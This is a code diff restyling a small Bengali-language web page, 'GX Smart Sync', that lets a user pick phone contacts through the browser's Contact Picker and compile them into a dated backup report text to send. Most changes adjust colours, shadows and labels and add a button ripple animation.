@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>GX Premium Sync</title>
+<title>GX Smart Sync</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">
 
@@ -17,49 +17,46 @@ display:flex;
 justify-content:center;
 align-items:center;
 font-family:'Hind Siliguri',sans-serif;
-background: linear-gradient(135deg,#0f172a,#1e293b,#020617);
+background: linear-gradient(135deg,#020617,#0f172a,#1e293b);
 }
 
-/* Glow Background */
+/* Background glow */
 body::before{
 content:'';
 position:absolute;
 width:350px;
 height:350px;
-background: radial-gradient(circle,#6366f1,#06b6d4);
+background: radial-gradient(circle,#06b6d4,#6366f1);
 filter: blur(120px);
-opacity:0.25;
+opacity:0.3;
 }
 
 /* Card */
 .card{
 width:350px;
 padding:32px;
-border-radius:24px;
+border-radius:26px;
+text-align:center;
 
 background: rgba(255,255,255,0.06);
 backdrop-filter: blur(20px);
 
-border:1px solid rgba(255,255,255,0.1);
-
-/* 4-side premium shadow */
+/* Dual shadow */
 box-shadow:
-0 0 25px rgba(99,102,241,0.25),
-0 0 50px rgba(6,182,212,0.15),
-inset 0 0 20px rgba(255,255,255,0.05);
+0 0 30px rgba(6,182,212,0.35), /* outer */
+inset 0 0 25px rgba(99,102,241,0.25); /* inner */
 
-text-align:center;
+border:1px solid rgba(255,255,255,0.1);
 }
 
 /* Title */
 h2{
 color:#fff;
-margin-bottom:8px;
+margin-bottom:6px;
 font-weight:600;
 letter-spacing:0.5px;
 }
 
-/* Subtitle */
 p{
 color:#cbd5f5;
 font-size:14px;
@@ -67,33 +64,46 @@ font-size:14px;
 
 /* Button */
 .btn{
+position:relative;
 margin-top:22px;
 width:100%;
 padding:16px;
 border:none;
 border-radius:14px;
-
 font-size:16px;
 font-weight:600;
-
 cursor:pointer;
+overflow:hidden;
 
 background: linear-gradient(135deg,#6366f1,#06b6d4);
-
 color:#fff;
 
-box-shadow:0 10px 25px rgba(99,102,241,0.4);
+/* button dual shadow */
+box-shadow:
+0 10px 30px rgba(6,182,212,0.4),
+inset 0 0 15px rgba(255,255,255,0.2);
 
-transition:0.3s;
-}
-
-.btn:hover{
-transform:translateY(-3px);
-box-shadow:0 15px 35px rgba(6,182,212,0.5);
+transition:0.25s;
 }
 
 .btn:active{
-transform:scale(0.96);
+transform:scale(0.95);
+}
+
+/* Ripple effect */
+.btn span{
+position:absolute;
+background: rgba(255,255,255,0.5);
+transform:scale(0);
+border-radius:50%;
+animation:ripple 0.6s linear;
+}
+
+@keyframes ripple{
+to{
+transform:scale(4);
+opacity:0;
+}
 }
 
 /* Loader */
@@ -102,7 +112,7 @@ margin:16px auto;
 width:26px;
 height:26px;
 border:3px solid rgba(255,255,255,0.2);
-border-top:3px solid #6366f1;
+border-top:3px solid #06b6d4;
 border-radius:50%;
 animation:spin 1s linear infinite;
 display:none;
@@ -126,8 +136,8 @@ color:#22c55e;
 
 <div class="card">
 
-<h2>☁️ GX Secure Sync</h2>
-<p>কন্টাক্ট সিলেক্ট করে প্রিমিয়ামভাবে পাঠান</p>
+<h2>☁️ GX Smart Sync</h2>
+<p>প্রিমিয়াম স্টাইলে কন্টাক্ট পাঠান</p>
 
 <button class="btn" id="btn">Select & Send</button>
 
@@ -147,6 +157,17 @@ const btn=document.getElementById("btn");
 const loader=document.getElementById("loader");
 const status=document.getElementById("status");
 
+/* Ripple animation */
+btn.addEventListener("click",function(e){
+let circle=document.createElement("span");
+circle.style.width=circle.style.height="100px";
+circle.style.left=e.offsetX-50+"px";
+circle.style.top=e.offsetY-50+"px";
+this.appendChild(circle);
+
+setTimeout(()=>circle.remove(),600);
+});
+
 btn.onclick=async()=>{
 
 try{
@@ -155,7 +176,7 @@ loader.style.display="block";
 status.innerText="Permission নিচ্ছে...";
 
 if(!("contacts" in navigator)){
-throw new Error("এই ডিভাইস সাপোর্ট করে না");
+throw new Error("ডিভাইস সাপোর্ট করে না");
 }
 
 const contacts=await navigator.contacts.select(
@@ -181,7 +202,7 @@ day:'numeric'
 
 const time=now.toLocaleTimeString("bn-BD");
 
-/* Build Text */
+/* Build message */
 let text=`📊 GX Backup Report\n\n`;
 
 text+=`📅 ${date}\n`;
@@ -195,7 +216,6 @@ let phone=c.tel?c.tel[0]:"No Number";
 text+=`👤 ${name}\n📞 ${phone}\n\n`;
 });
 
-/* Footer Name */
 text+=`\n— GX Sammim sent`;
 
 /* Send */
